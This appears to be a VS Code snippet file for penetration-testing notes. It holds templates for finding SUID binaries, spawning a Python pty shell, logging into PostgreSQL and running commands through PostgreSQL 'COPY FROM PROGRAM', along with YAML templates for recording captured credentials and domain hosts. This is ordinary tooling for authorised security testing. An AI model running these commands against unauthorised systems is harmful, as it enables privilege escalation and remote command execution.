{
	"find executable with suid": {
		"prefix": "find suid",
		"body": [
			"find / -perm -u=s -type f 2>/dev/null"
		],
		"description": "find all files with suid permission"
	},
	"pty python console": {
		"prefix": "pty python",
		"body": [
			"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
		],
		"description": "spawn a pty python console"
	},
	"psql login": {
		"prefix": "psql",
		"body": [
			"PGPASSWORD='$1' psql -h ${2:\\$RHOST} -U \"${3:\\$USER}\" ${4:\\$DATABASE} $0"
		],
		"description": "login to psql as postgres user"
	},
	"psql rce with copy sql query": {
		"prefix": "psql",
		"body": [
			"drop table if exists ${1:RESULT}; create table ${1:RESULT} (data text); copy ${1:RESULT} from program '${2:COMMAND}' ; select * from ${1:RESULT};${0}"
		],
		"description": "execute command on remote psql server"
	},
	"user credentials yaml creation": {
		"prefix": "```yaml credentials",
		"body": [
			"```yaml credentials",
			"- user: ${1:admin}",
			"  password: ${2:password}",
			"  nt_hash: ${2:5fbc3d5fec8206a30f4b6c473d68ae76}",
			"  login: ${3:EXAMPLE}",
			"  is_current: ${4:true}",
			"  props: {}",
			"```"
		],
		"description": "user credentials"
	},
	"host yaml creation": {
		"prefix": "```yaml host",
		"body": [
			"```yaml host",
			"- hostname: ${1:example.com}",
			"  ip: ${2:192.168.1.100}",
			"  alias:",
			"    - dc01.${1:example.com}",
			"  is_dc: ${5:false}",
			"  is_current: ${6:true}",
			"  is_current_dc: ${7:false}",
			"  props: {}",
			"```"
		],
		"description": "host information"
	},
	"shell block creation": {
		"prefix": "```sh",
		"body": [
			"```sh",
			"$0",
			"```"
		],
		"description": "shell block"
	}
}